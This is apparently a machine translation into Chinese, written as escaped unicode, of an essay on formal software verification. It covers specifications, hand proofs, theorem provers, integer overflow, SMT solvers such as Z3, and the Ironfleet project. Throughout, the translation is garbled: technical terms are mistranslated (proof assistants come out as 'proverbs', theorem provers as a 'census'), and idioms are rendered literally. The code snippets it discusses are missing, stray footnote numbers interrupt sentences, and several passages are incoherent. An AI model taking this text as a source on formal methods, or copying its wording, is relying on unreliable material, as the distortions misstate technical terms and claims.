\u9a8c\u8bc1\u8bc1\u660e\u4ee3\u7801\u4e0e\u5176\u89c4\u8303\u5339\u914d\u3002\u8fd9\u63d0\u51fa\u4e86\u4e00\u4e2a\u95ee\u9898\uff1a\u6211\u4eec\u5982\u4f55\u77e5\u9053\u6211\u4eec\u6709\u6b63\u786e\u7684\u89c4\u683c\uff1f\u627e\u5230\u5408\u9002\u7684\u89c4\u8303\u662f\u6b63\u5f0f\u65b9\u6cd5\u4e2d\u6700\u5927\u7684\u6311\u6218\u4e4b\u4e00\u3002\u5b83\u4e5f\u662f\u6700\u5347\u7ea7\u7684\u53cd\u5bf9\u610f\u89c1\u4e4b\u4e00\uff0c\u4f46\u6000\u7591\u8bba\u8005\u7684\u610f\u601d\u662f\u5b83\u4e0e\u5021\u5bfc\u8005\u7684\u60f3\u6cd5\u7684\u65b9\u5f0f\u5b8c\u5168\u76f8\u540c\u3002\n \u5f53\u6237\u5916\u4eba\u8bf4\u201c\u4f60\u5982\u4f55\u6709\u6b63\u786e\u7684\u89c4\u683c\uff1f\u201d\u4ed6\u4eec\u901a\u5e38\u5728\u8003\u8651\u9a8c\u8bc1\uff1a\u663e\u793a\u4e00\u4e2a\u89c4\u683c\u5b9e\u9645\u4e0a\u662f\u5ba2\u6237\u60f3\u8981\u7684\u3002\u5982\u679c\u60a8\u6b63\u5f0f\u8bc1\u660e\u60a8\u7684\u4ee3\u7801\u6392\u5e8f\u5217\u8868\uff0c\u4f46\u5ba2\u6237\u5b9e\u9645\u4e0a\u5e0c\u671b\u4f18\u6b65\u8fdb\u884c\u6c64\u2122\uff0c\u60a8\u53ea\u6d6a\u8d39\u4e86\u4e00\u5806\u65f6\u95f4\u3002\u53ea\u6709\u901a\u8fc7\u5feb\u901f\u8fed\u4ee3\u548c\u77ed\u7684\u53cd\u9988\u5468\u671f\uff0c\u4eba\u4eec\u4e89\u8fa9\uff0c\u60a8\u662f\u5426\u53ef\u4ee5\u9a8c\u8bc1\u60a8\u7684\u8981\u6c42\u3002 \n\u786e\u5b9e\uff0c\u9a8c\u8bc1\u4ee3\u7801\u65e0\u6cd5\u9a8c\u8bc1\u4ee3\u7801\u3002\u4f46\u662f\u8fd9\u4e2a\u53c2\u6570\u6709\u4e24\u4e2a\u95ee\u9898\u3002\u9996\u5148\u662f\u5b83\u53ea\u662f\u5ef6\u8fdf\u4e86FM\u7684\u4ef7\u503c\uff0c\u800c\u4e0d\u662f\u5b8c\u5168\u6d88\u9664\u5b83\u3002\u4e00\u65e6\u60a8\u5b8c\u6210\u4e86\u5feb\u901f\u8fed\u4ee3\uff0c\u60a8\u53ef\u80fd\u4f1a\u60f3\u5230\u60a8\u7684\u5ba2\u6237\u60f3\u8981\u7684\u5185\u5bb9\u3002\u7136\u540e\u4f60\u5f00\u59cb\u9a8c\u8bc1\u4ee3\u7801\u3002\u7b2c\u4e8c\uff0c\u867d\u7136\u6211\u4eec\u4e0d\u77e5\u9053\u7a76\u7adf\u662f\u4ec0\u4e48\u5ba2\u6237\u60f3\u8981\u7684\uff0c\u4f46\u6709\u4e9b\u4e8b\u60c5\u6211\u4eec\u53ef\u4ee5\u5047\u8bbe\u4ed6\u4eec\u4e0d\u60f3\u8981\u3002\u4ed6\u4eec\u4e0d\u5e0c\u671b\u8f6f\u4ef6\u968f\u673a\u5d29\u6e83\u3002\u4ed6\u4eec\u4e0d\u60f3\u8981\u5b89\u5168\u6f0f\u6d1e\u3002\u6bcf\u4e2a\u4eba\u90fd\u8ba4\u8bc6\u5230\u8fd9\u4e00\u70b9\uff1a\u6bd5\u7adf\uff0c\u6ca1\u6709\u4eba\u8bf4\u4f60\u5e94\u8be5\u5728\u4f60\u8fed\u4ee3\u65f6\u8df3\u8fc7\u5355\u4f4d\u6d4b\u8bd5\u3002\u56e0\u6b64\uff0c\u81f3\u5c11\u8bc1\u660e\u60a8\u7684\u7248\u672c\u63a7\u5236\u7cfb\u7edf\u4e0d\u4f1a\u968f\u673a\u5220\u9664\u7528\u6237\u9884\u8ba2\u7684\u7ae0\u8282\u3002 7.\n \u627e\u5230\u6b63\u786e\u7684\u89c4\u683c\u7684\u95ee\u9898\u66f4\u4e3a\u6839\u672c\uff1a\u6211\u4eec\u7ecf\u5e38\u4e0d\u77e5\u9053\u6211\u4eec\u60f3\u8981\u7684\u89c4\u683c\u662f\u4ec0\u4e48\u3002\u6211\u4eec\u8003\u8651\u4e86\u4eba\u7c7b\u7684\u8981\u6c42\uff0c\u800c\u4e0d\u662f\u6570\u5b66\u672f\u8bed\u3002\u5982\u679c\u6211\u8bf4\u201c\u8fd9\u5e94\u8be5\u533a\u5206\u516c\u56ed\u7684\u9e1f\u7c7b\u201d\uff0c\u6211\u5728\u8bf4\u4ec0\u4e48\uff1f\u6211\u53ef\u4ee5\u901a\u8fc7\u7ed9\u4e88\u4e00\u5806\u516c\u56ed\u548c\u9e1f\u7c7b\u7684\u7167\u7247\u6765\u89e3\u91ca\u4e00\u4e2a\u4eba\uff0c\u4f46\u8fd9\u53ea\u662f\u5177\u4f53\u7684\u4f8b\u5b50\uff0c\u800c\u4e0d\u662f\u6355\u6349\u4ece\u9e1f\u7c7b\u533a\u5206\u516c\u56ed\u7684\u60f3\u6cd5\u3002\u4e3a\u4e86\u5b9e\u9645\u7ffb\u8bd1\u6210\u6b63\u5f0f\u89c4\u683c\u8981\u6c42\u6211\u4eec\u80fd\u591f\u5c06\u4eba\u7c7b\u6982\u5ff5\u5f62\u5f0f\u5f62\u5f0f\u5316\uff0c\u8fd9\u662f\u4e00\u4e2a\u4e25\u91cd\u7684\u6311\u6218\u3002\n \u4e0d\u8981\u8ba9\u6211\u9519\u4e86\uff0c\u6709\u53ef\u80fd\u5f04\u6e05\u695a\u8fd9\u91cc\u7684\u9002\u5f53\u89c4\u683c\uff0c\u4e13\u5bb6\u4e00\u76f4\u8fd9\u6837\u505a\u3002\u4f46\u662f\u5199\u4f5c\u9002\u5f53\u7684\u89c4\u8303\u662f\u60a8\u9700\u8981\u5f00\u53d1\u7684\u6280\u80fd\uff0c\u5c31\u50cf\u60a8\u9700\u8981\u5f00\u53d1\u7f16\u7801\u6280\u80fd\u4e00\u6837\u3002\u8fd9\u5c31\u662f\u4e3a\u4ec0\u4e48\u8bb8\u591a\u4ee3\u7801\u9a8c\u8bc1\u7684\u6700\u8fd1\u6210\u529f\u7684\u6210\u529f\u90fd\u662f\u6211\u4eec\u60f3\u8981\u7684\u660e\u663e\u5730\u56fe\u7684\u4e8b\u60c5\u4ee5\u53ca\u6211\u4eec\u53ef\u4ee5\u8868\u8fbe\u6211\u4eec\u60f3\u8981\u7684\u4e1c\u897f\u3002\u4f8b\u5982\uff0cCompcert\u662f\u4e00\u4e2a\u6b63\u5f0f\u9a8c\u8bc1\u7684C\u7f16\u8bd1\u5668\u3002\u8fd9\u4e2a\u89c4\u8303\u6709\u201c\u8fd9\u7edd\u4e0d\u4f1a\u8bef\u89e3\u201d\u3002\n \u8fd9\u4e00\u5207\u90fd\u4e0d\u662f\u5b9e\u9645\u7684\u9a8c\u8bc1\u90e8\u5206\u3002\u6709\u4e00\u4e2a\u89c4\u683c\uff0c\u60a8\u4ecd\u7136\u9700\u8981\u8bc1\u660e\u4ee3\u7801\u5339\u914d\u89c4\u8303\u3002\n  \u6211\u4eec\u770b\u5230\u7684\u6700\u65e9\u7684\u4ee3\u7801\u9a8c\u8bc1\u65b9\u5f0f\u662fDijkstra\u98ce\u683c\u7684\u201c\u975e\u5e38\u52aa\u529b\u5730\u601d\u8003\u4e3a\u4ec0\u4e48\u8fd9\u662f\u771f\u5b9e\u7684\u201d\u65b9\u6cd5\uff0c\u8fd9\u57fa\u672c\u4e0a\u662fallol\u65e8\u5728\u5e2e\u52a9\u505a\u7684\u3002\u4f8b\u5982\uff0c\u6211\u53ef\u80fd\u4f1a\u201c\u8bc1\u660e\u201d\u63d2\u5165\u6392\u5e8f\u901a\u8fc7\u4e89\u8bba\n \u57fa\u672c\u60c5\u51b5\uff1a\u5982\u679c\u6211\u4eec\u6709\u4e00\u4e2a\u7a7a\u5217\u8868\u5e76\u5c06\u4e00\u4e2a\u5143\u7d20\u6dfb\u52a0\u5230\u5b83\uff0c\u90a3\u5c06\u662f\u552f\u4e00\u7684\u5143\u7d20\uff0c\u56e0\u6b64\u5b83\u5c06\u88ab\u6392\u5e8f\u3002\n \u5982\u679c\u6211\u4eec\u6709\u4e00\u4e2a\u5e26\u6709k\u4e2a\u5143\u7d20\u7684\u6392\u5e8f\u5217\u8868\u5e76\u6dfb\u52a0\u4e00\u4e2a\u5143\u7d20\uff0c\u6211\u4eec\u5c06\u63d2\u5165\u5143\u7d20\uff0c\u4ee5\u4fbf\u5728\u6240\u6709\u8f83\u5c0f\u7684\u6570\u5b57\u4e4b\u540e\u548c\u6240\u6709\u66f4\u5927\u7684\u6570\u5b57\u4e4b\u540e\u3002\u8fd9\u610f\u5473\u7740\u5217\u8868\u4ecd\u7136\u6392\u5e8f\u3002 \n\u663e\u7136\uff0c\u5b83\u770b\u8d77\u6765\u6bd4\u8fd9\u66f4\u4e25\u683c\uff0c\u4f46\u8fd9\u662f\u4e00\u822c\u7684\u60f3\u6cd5\u3002 Dijkstra\u7b49\u4eba\u4f7f\u7528\u8fd9\u79cd\u98ce\u683c\u6765\u8bc1\u660e\u4e00\u5806\u7b97\u6cd5\u662f\u6b63\u786e\u7684\uff0c\u5305\u62ec\u8bb8\u591a\u5e76\u53d1\u539f\u8bed\u3002\u8fd9\u4e5f\u662f\u4e00\u79cd\u98ce\u683c\uff0c\u5b83\u5f15\u8d77\u4e86Knuth Quote\u201c\u8bf7\u6ce8\u610f\u4e0a\u9762\u7684\u4ee3\u7801\u4e2d\u7684\u9519\u8bef;\u6211\u53ea\u8bc1\u660e\u5b83\u662f\u6b63\u786e\u7684\uff0c\u6ca1\u6709\u5c1d\u8bd5\u8fc7\u3002\u201c\u5728\u6ca1\u6709\u4eba\u901a\u77e5\u7684\u65b9\u5f0f\u641e\u5b9a\u6570\u5b66\u8bc1\u660e\u662f\u975e\u5e38\u5bb9\u6613\u7684\uff0c\u5e76\u4e14\u6211\u8bfb\u5230\u4e8620\uff05\u7684\u53d1\u5e03\u7684\u6570\u5b66\u8bc1\u660e\u7684\u4f30\u8ba1\uff0c\u5b83\u4eec\u6709\u9519\u8bef\u3002 Peter Guttmann\u6709\u4e00\u4e2a\u5f88\u597d\u7684\u8bba\u6587\uff0c\u5c31\u5982\u4f55\u83b7\u5f97\u4e86\u591a\u6cd5\u4ee3\u7801\uff0c\u5982\u679c\u8fd0\u884c\uff0c\u90a3\u4e48\u5927\u91cf\u7684\u201c\u7ecf\u8fc7\u9a8c\u8bc1\u7684\u201d\u4ee3\u7801\u4f1a\u7acb\u5373\u5d29\u6e83\u3002\n \u540c\u65f6\u6211\u4eec\u6b63\u5728\u63a2\u7d22\u5982\u4f55\u81ea\u52a8\u8bc1\u660e\u6570\u5b66\u5b9a\u7406\uff0c\u8fd9\u662f1967\u5e74\u51fa\u6765\u7684\u7b2c\u4e00\u4e2a\u6b64\u7c7b\u5b9a\u671f\u5148\u9a71\u3002\u5e15\u65af\u5361\u793e\u533a\u7684\u7814\u7a76\u4eba\u5458\u6b63\u5728\u4f7f\u7528\u5b9a\u7406\u666e\u901a\u7684\u666e\u901a\u9a8c\u8bc1\u8ba1\u5212\u4e8e20\u4e16\u7eaa70\u5e74\u4ee3\u521d\u671f\uff0c\u7136\u540e\u901a\u8fc7\u4e2d\u671f\u7f16\u7a0b\u4e13\u7528\u9a8c\u8bc1\u8bed\u8a00\u8fdb\u884c\u7f16\u7a0b\u3002\u5341\u5e74\u3002\u4eba\u4eec\u5c06\u5199\u4e00\u4e9b\u4ee3\u7801\u7684\u5c5e\u6027\uff0c\u7136\u540e\u5199\u4e00\u4e2a\u53ef\u9009\u62e9\u7684\u8bc1\u660e\u4ee3\u7801\u5177\u6709\u8fd9\u4e9b\u5c5e\u6027\u3002\u65e9\u4e9b\u65f6\u5019\u5b9a\u7406\u666e\u67e5\u53ea\u662f\u5e2e\u52a9\u4eba\u7c7b\u68c0\u67e5\u5e76\u9a8c\u8bc1\u8bc1\u660e\uff0c\u800c\u66f4\u590d\u6742\u7684\u4eba\u53ef\u4ee5\u81ea\u5df1\u8bc1\u660e\u5b9a\u7406\u7684\u90e8\u5206\u3002\n   \u8bc1\u636e\u5f88\u96be\u3002\u4ee4\u4eba\u8ba8\u538c\u7684\u52aa\u529b\u3002 \u201c\u9000\u51fa\u7f16\u7a0b\u5e76\u52a0\u5165\u9a6c\u620f\u56e2\u201d\u3002\u4ee4\u4eba\u60ca\u8bb6\u7684\u662f\uff0c\u6b63\u5f0f\u7684\u4ee3\u7801\u8bc1\u660e\u5f80\u5f80\u6bd4\u5927\u591a\u6570\u6570\u5b66\u5bb6\u5199\u7684\u8bc1\u636e\u66f4\u4e25\u683c\uff01\u6570\u5b66\u662f\u4e00\u4e2a\u975e\u5e38\u6709\u521b\u9020\u6027\u7684\u6d3b\u52a8\uff0c\u5177\u6709\u660e\u786e\u7684\u7b54\u6848\uff0c\u5982\u679c\u60a8\u5c55\u793a\u60a8\u7684\u5de5\u4f5c\uff0c\u624d\u80fd\u6709\u6548\u3002\u521b\u9020\u529b\uff0c\u5f62\u5f0f\u4e3b\u4e49\u548c\u8ba1\u7b97\u673a\u662f\u4e00\u4e2a\u4e0d\u597d\u7684\u7ec4\u5408\u3002\n \u91c7\u53d6\u4e0a\u8ff0\u8bf1\u5bfc\u3002\u4efb\u4f55\u6570\u5b66\u5bb6\u90fd\u53ef\u4ee5\u770b\u51fa\u5b83\uff0c\u7acb\u5373\u77e5\u9053\u5b83\u662f\u4ec0\u4e48\uff0c\u5b83\u662f\u5982\u4f55\u5de5\u4f5c\u7684\uff0c\u4ee5\u53ca\u5b83\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u5982\u4f55\u6709\u6548\u3002\u8fd9\u4e9b\u90fd\u662f\u6211\u4eec\u9700\u8981\u4e25\u683c\u5730\u5f62\u5f0f\u5316\u7684\u4e1c\u897f\u3002\u4e0e\u77db\u76fe\u7684\u8bc1\u660e\u76f8\u540c\uff0c\u901a\u8fc7\u4e92\u76f8\u9a8c\u8bc1\u7b49\uff0c\u6211\u4eec\u8fd8\u9700\u8981\u6b63\u89c4\u5316\u6bcf\u4e00\u4e2a\u5047\u8bbe\uff0c\u751a\u81f3\u662f\u5927\u591a\u6570\u6570\u5b66\u5bb6\u4e0d\u70e6\u607c\u7684\u4e1c\u897f\u3002\u4f8b\u5982\uff0c\u6dfb\u52a0\u662f\u5173\u8054\uff1aA +\uff08B + C\uff09=\uff08A + B\uff09+ C.\u5b9a\u7406\u7bb4\u8a00\u5e76\u4e0d\u662f\u5148\u9a8c\u7684\u771f\u5b9e\u3002\u60a8\u8981\u4e48\u5fc5\u987b\u8bc1\u660e\u5b83\uff08\u786c\uff09\uff0c\u58f0\u660e\u8fd9\u662f\u4e00\u4e2a\u5047\u8bbe\u7bb4\u8a00\u53ef\u4ee5\u4f5c\u4e3a\u771f\u5b9e\uff08\u5371\u9669\uff09\uff0c\u6216\u8005\u4ece\u5df2\u7ecf\u8bc1\u660e\u5b83\uff08\u6602\u8d35\uff09\u7684\u4eba\u90a3\u91cc\u8d2d\u4e70\u5b9a\u7406\u56fe\u4e66\u9986\u3002\u65e9\u671f\u5ba1\u67e5\u52a9\u7406\u7ade\u4e89\u5185\u7f6e\u7b56\u7565\u7b56\u7565\u548c\u6346\u7ed1\u5b9a\u7406\u56fe\u4e66\u9986\u3002\u9996\u6b21\u5e7f\u6cdb\u7684\u6821\u9a8c\u9a8c\u8bc1\u5458\u4e4b\u4e00\uff0cSpade\uff0c\u5c06\u5176\u5b8c\u6574\u7684\u7b97\u672f\u5e93\u4f5c\u4e3a\u4e00\u4e2a\u5173\u952e\u9500\u552e\u70b9\u5ba3\u4f20\u3002\n \u63a5\u4e0b\u6765\uff0c\u4f60\u5fc5\u987b\u5b9e\u9645\u4e0a\u5f97\u5230\u8bc1\u636e\u3002\u60a8\u53ef\u4ee5\u8ba9\u8c1a\u8bed\u5c1d\u8bd5\u81ea\u5df1\u627e\u5230\u5b83\uff0c\u6216\u81ea\u5df1\u5199\u5b83\u3002\u5728\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u81ea\u52a8\u63a8\u65ad\u51fa\u8bc1\u660e\u662f\u4e0d\u53ef\u8bc6\u522b\u7684\u3002\u5bf9\u4e8e\u6781\u5ea6\u9650\u5236\u7684\u60c5\u51b5\uff0c\u5982\u547d\u9898\u903b\u8f91\u6216HM Type-Checki\uff0c\u5b83\u662f\u201c\u53ea\u6709\u201dNP-Complete\u3002\u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u90fd\u9677\u5165\u4e86\u81ea\u5df1\u7684\u5927\u90e8\u5206\u8bc1\u636e\uff0c\u5e76\u8ba9\u8ba1\u7b97\u673a\u9a8c\u8bc1\u5b83\u662f\u6b63\u786e\u7684\u3002\u8fd9\u610f\u5473\u7740\u60a8\u9700\u8981\u4e00\u4e2a\u5f3a\u5927\u7684\u80cc\u666f\uff1a\n \u60a8\u6b63\u5728\u4f7f\u7528\u7684\u5b9a\u7406\u8c1a\u8bed\u7684\u590d\u6742\u6027\uff0c\u8fd9\u662f\u4e00\u4e2a\u4e13\u4e1a\n \u8ba9\u4e8b\u60c5\u53d8\u5f97\u66f4\u7cdf\uff0c\u7535\u8111\u7269\u4e1a\u5c06\u5927\u91cf\u7684\u6273\u624b\u6254\u8fdb\u8bc1\u660e\u3002\u8fd8\u8bb0\u5f97\u6211\u5982\u4f55\u8bf4\u5047\u8bbe\u52a0\u6cd5\u662f\u5173\u8054\u662f\u5371\u9669\u7684\uff1f\u67d0\u4e9b\u8bed\u8a00\u5e76\u4e0d\u5173\u8054\u3002 C ++\u5177\u6709INT_MAX\u3002 \uff08\uff08-1\uff09+ int_max\uff09+ 1\u662fINT_MAX\u3002 -1 +\uff08int_max + 1\uff09\u672a\u5b9a\u4e49\u3002\u5982\u679c\u60a8\u5047\u8bbeC ++\u4e2d\u7684\u5173\u8054\u6dfb\u52a0\uff0c\u60a8\u7684\u8bc1\u660e\u5c06\u662f\u9519\u8bef\u7684\uff0c\u5e76\u4e14\u60a8\u7684\u4ee3\u7801\u5c06\u88ab\u6253\u7834\u3002\u60a8\u8981\u4e48\u5fc5\u987b\u907f\u514d\u4f7f\u8fd9\u79cd\u65ad\u8a00\uff0c\u6216\u8bc1\u660e\u4e3a\u60a8\u7684\u7279\u5b9a\u4ee3\u7801\u6bb5\uff0c\u60a8\u6c38\u8fdc\u4e0d\u4f1a\u9020\u6210\u6ea2\u51fa\u3002 \n\u73b0\u5728\uff0c\u60a8\u53ef\u4ee5\u8bf4\u672a\u5b9a\u4e49\u7684\u6dfb\u52a0\u662f\u4e00\u4e2a\u9519\u8bef\uff0c\u800c\u4e14\u60a8\u5e94\u8be5\u4f7f\u7528\u5e26\u6709\u672a\u7ed1\u5b9a\u6574\u6570\u7684\u8bed\u8a00\u3002\u4f46\u5927\u591a\u6570\u8bed\u8a00\u5177\u6709\u59a8\u788d\u8bc1\u660e\u7684\u79ef\u6781\u529f\u80fd\u3002\u91c7\u53d6\u4ee5\u4e0b\u4ee3\u7801\u6bb5\uff1a\n  \u8fd9\u603b\u662f\u771f\u7684\u5417\uff1f\u4f9d\u9760\u3002\u4e5f\u8bb8f\u4fee\u6539a\u3002\u4e5f\u8bb8\u53e6\u4e00\u4e2a\u7ebf\u7a0b\u5e76\u53d1\u4fee\u6539a\u3002\u4e5f\u8bb8b\u522b\u4f20\u5230a\uff0c\u56e0\u6b64\u4fee\u6539\u5b83\u4e5f\u4fee\u6539\u4e86\u4e00\u4e2a\u3002 8\u5982\u679c\u60a8\u7684\u8bed\u8a00\u4e2d\u7684\u4efb\u4f55\u4e00\u79cd\uff0c\u5219\u5fc5\u987b\u660e\u786e\u8bc1\u660e\u4ed6\u4eec\u4e0d\u4f1a\u53d1\u751f\u5728\u8fd9\u91cc\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u7eaf\u5ea6\u6709\u52a9\u4e8e\u5728\u5176\u4ed6\u60c5\u51b5\u4e0b\u4e22\u5931\u8bc1\u660e\uff0c\u56e0\u4e3a\u5b83\u8feb\u4f7f\u60a8\u4f7f\u7528\u9012\u5f52\u548c\u66f4\u9ad8\u9636\u51fd\u6570\u6765\u5b8c\u6210\u5b8c\u6210\u7684\u4e1c\u897f\u3002\u987a\u4fbf\u63d0\u53ca\uff0c\u8fd9\u4e24\u8005\u90fd\u662f\u7f16\u5199\u826f\u597d\u529f\u80fd\u8ba1\u5212\u7684\u57fa\u7840\u3002\u5bf9\u4e8e\u8bc1\u660e\uff0c\u7f16\u7801\u6709\u4ec0\u4e48\u597d\u5904\uff01 9.\n \u6b63\u5f0f\u7684\u9a8c\u8bc1\u8005\u6709\u56f0\u5883\uff1a\u8fd9\u79cd\u8bed\u8a00\u66f4\u52a0\u8868\u8fbe\uff0c\u5b83\u8d8a\u96be\u4ee5\u8bc1\u660e\u5b83\u3002\u4f46\u8bed\u8a00\u8868\u73b0\u8f83\u5c11\uff0c\u8d8a\u96be\u4ee5\u5199\u5165\u5b83\u3002\u7b2c\u4e00\u4e2a\u751f\u4ea7\u9a8c\u8bc1\u8bed\u8a00\u662f\u66f4\u5177\u8868\u73b0\u6027\u8bed\u8a00\u7684\u5b50\u96c6\uff1aACL2\u662fLISP\u7684\u4e00\u4e2a\u5b50\u96c6\uff0cEuclid\u662f\u5e15\u65af\u5361\u7684\u4e00\u90e8\u5206\u7b49\u3002\u5230\u76ee\u524d\u4e3a\u6b62\uff0c\u6211\u4eec\u5df2\u7ecf\u8ba8\u8bba\u8fc7\u7684\u4e1c\u897f\uff0c\u5b9e\u9645\u4e0a\u662f\u4ee5\u8bc1\u660e\u771f\u5b9e\u4e16\u754c\u7684\u8ba1\u5212\uff0c\u8fd9\u5c31\u662f\u53ea\u662f\u684c\u9762\u8d4c\u6ce8\u9996\u5148\u5f00\u59cb\u5199\u4f5c\u8bc1\u660e\u3002\n \u8bc1\u636e\u5f88\u96be\u3002\u7136\u800c\uff0c\u4ed6\u4eec\u4e00\u76f4\u8d8a\u6765\u8d8a\u597d\u3002\u6821\u6b63\u52a9\u7406\u7814\u7a76\u4eba\u5458\u7ee7\u7eed\u6dfb\u52a0\u65b0\u7684\u542f\u53d1\u5f0f\uff0c\u5b9a\u7406\u5e93\uff0c\u9884\u53d6\u91cf\u7ec4\u4ef6\u7b49\u786c\u4ef6\u6539\u8fdb\uff0c\u4ee5\u53ca\u66f4\u5feb\u7684\u8ba1\u7b97\u673a\u610f\u5473\u7740\u66f4\u5feb\u7684\u641c\u7d22\u3002\n  \u8fd9\u4e9b\u65e5\u5b50\u6700\u591a\u7684\u4eba\u53e3\u8bc1\u660e\u81ea\u52a8\u5316\u662fSMT\u3002 10\u975e\u5e38\u5e7f\u6cdb\u5730\u8bf4\uff0cSMT\u6c42\u89e3\u5668\u53ef\u4ee5\u5c06\uff08\u4e00\u4e9b\uff09\u5b9a\u7406\u8f6c\u5411\u7ea6\u675f\u6ee1\u8db3\u95ee\u9898\u3002\u8fd9\u5c06\u521b\u9020\u6027\u95ee\u9898\u53d8\u6210\u8ba1\u7b97\u4e00\u4e2a\u3002\u60a8\u4ecd\u7136\u9700\u8981\u5c06\u5176\u4e2d\u95f4\u95ee\u9898\uff08LEMMAS\uff09\u4f5c\u4e3a\u5b9a\u7406\u4e2d\u7684\u6b65\u9aa4\u63d0\u4f9b\uff0c\u4f46\u8fd9\u6bd4\u8bc1\u660e\u6bcf\u4e2a\u8be5\u6b7b\u7684\u4e8b\u7269\u66f4\u597d\u3002\u65af\u5766\u798f\u5fb7\u4e8e1998\u5e74\u53d1\u5e03\u4e86\u7b2c\u4e00\u4e2a\u201c\u73b0\u4ee3\u201dSMT Solver\uff0cStanford\u6709\u6548\u6027\u68c0\u67e5\u5458\u3002\u4ed6\u4eec\u5efa\u7acb\u57282002\u5e74\u53d1\u5e03\u7684CVC\uff0c\u8fd9\u6d89\u53ca\u8f7b\u5fae\u7684\u751f\u4ea7\u4f7f\u7528\u3002 11.\n \u5f53Microsoft Research\u53d1\u5e03Z3\u65f6\uff0c\u573a\u666f\u53d1\u751f\u57282006\u5e74\u5de6\u53f3\u3002 Z3\u7684\u5927\u4f18\u52bf\u662f\u6bd4\u5176\u4ed6SMT\u66f4\u6709\u7528\u6237\u53cb\u597d\uff0c\u8bda\u5b9e\u5e76\u4e0d\u662f\u5f88\u591a\u3002 MSR\u5728\u5185\u90e8\u4f7f\u7528\u5b83\u6765\u5e2e\u52a9\u8bc1\u660eWindows\u5185\u6838\u7684\u5c5e\u6027\uff0c\u8fd9\u610f\u5473\u7740\u5b83\u4eec\u5728UX\u4e2d\u6295\u5165\u4e86\u66f4\u591a\u6bd4\u8f83\u6700\u5c0f\u7684\u3002 Z3\u53ef\u4ee5\u8bf4\u662f\u5168\u9762\u7684\u9ed8\u8ba4\u9009\u62e9\u8fdb\u884c\u901a\u7528\u81ea\u52a8\u5316\u8bc1\u660e\u3002 CV\u4e2d\u7684\u8bb8\u591a\u5de5\u5177\u73b0\u5728\u4f9d\u8d56\u4e8eSMT\uff0c\u5e76\u4e14\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5927\u591a\u6570Z3\u90fd\u6709Z3\u3002\n \u65e0\u969c\u788d\u7684SMT\u89e3\u51b3\u662f\u88e4\u5b50\u5230\u6b63\u5f0f\u9a8c\u8bc1\u793e\u533a\u7684\u8e22\u811a\uff0c\u56e0\u4e3a\u5b83\u4f7f\u5f97\u5f88\u591a\u7b80\u5355\u7684\u8bc1\u636e\u7410\u788e\u548c\u4ee4\u4eba\u8ba8\u538c\u7684\u8bc1\u636e\u3002\u53cd\u8fc7\u6765\uff0c\u8fd9\u610f\u5473\u7740\u4eba\u4eec\u53ef\u4ee5\u4ee5\u66f4\u5feb\u9012\u7684\u8bed\u8a00\u5f00\u59cb\u8bc1\u660e\u4e1c\u897f\uff0c\u56e0\u4e3a\u4ed6\u4eec\u73b0\u5728\u6709\u80fd\u529b\u89e3\u51b3\u8868\u8fbe\u5f0f\u9648\u8ff0\u7684\u6311\u6218\u3002 Ironfleet\u9879\u76ee\u4e2d\u53ef\u4ee5\u770b\u5230\u4ee5\u4e0b\u4ee4\u4eba\u96be\u4ee5\u7f6e\u4fe1\u7684\u8fdb\u5c55\uff1a\u901a\u8fc7\u4f7f\u7528\u5148\u8fdb\u7684SMT\u6c42\u89e3\u5668\u548c\u5c16\u7aef\u9a8c\u8bc1\u8bed\u8a00\uff0c\u5fae\u8f6f\u53ea\u80fd\u57283.7\u4eba\u4e2d\u7f16\u51995,000\u884c\u9a8c\u8bc1\u7684DAFNY\u4ee3\u7801\uff01\u8fd9\u662f\u4e00\u5929\u56db\u6574\u884c\u7684\u70bd\u70ed\u901f\u5ea6\u3002 12. \n\u73b0\u5728\u5c06\u662f\u4e00\u4e2a\u597d\u65f6\u523b\u9000\u540e\u4e00\u6b65\u5e76\u95ee\u201c\u4ec0\u4e48\u662f\u70b9\uff1f\u201d\u6211\u4eec\u8bd5\u56fe\u8bc1\u660e\u4e00\u4e9b\u7a0b\u5e8f\u7b26\u5408\u67d0\u4e9b\u89c4\u8303\u3002\u6b63\u786e\u6027\u662f\u4e00\u4e2a\u9891\u8c31\u3002\u9a8c\u8bc1\u95ee\u9898\u6709\u4e24\u90e8\u5206\u95ee\u9898\uff1a\u5982\u4f55\u5ba2\u89c2\u5730\u201c\u6b63\u786e\u201d\u60a8\u7684\u7a0b\u5e8f\u662f\uff0c\u4ee5\u53ca\u60a8\u4e25\u683c\u9a8c\u8bc1\u4e86\u6b63\u786e\u6027\u3002\u663e\u7136\uff0c\u66f4\u591a\u7684\u9a8c\u8bc1\u4f18\u4e8e\u9a8c\u8bc1\u7684\u66f4\u4f4e\uff0c\u4f46\u9a8c\u8bc1\u6210\u672c\u65f6\u95f4\u548c\u91d1\u94b1\u3002\u5982\u679c\u6211\u4eec\u6709\u591a\u79cd\u7ea6\u675f\u6765\u4f18\u5316\uff08\u6027\u80fd\uff0c\u65f6\u95f4\uff0c\u6210\u672c\u7b49\uff09\uff0c\u5219\u6700\u4f18\u60e0\u4e0d\u4e00\u5b9a\u662f\u201c\u5b8c\u5168\u8bc1\u660e\u6b63\u786e\u201d\u3002\u90a3\u4e48\u95ee\u9898\u53d8\u6210\u4e86\u201c\u6211\u4eec\u9700\u8981\u7684\u6700\u5c0f\u9a8c\u8bc1\u662f\u4ec0\u4e48\u201d\u548c\u201c\u5230\u8fbe\u90a3\u91cc\u7684\u6210\u672c\u662f\u591a\u5c11\u3002\u201d\u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u60a8\u53ef\u4ee5\u9003\u907f\uff0c\u598290\uff05\u621695\uff05\u621699\uff05\u6b63\u786e\u3002\u4f60\u53ef\u80fd\u4f1a\u66f4\u597d\u5730\u82b1\u65f6\u95f4\u8ba9UX\u66f4\u597d\u5730\u83b7\u5f97\u6700\u540e1\uff05\u7684\u6b63\u786e\u6027\u3002\n 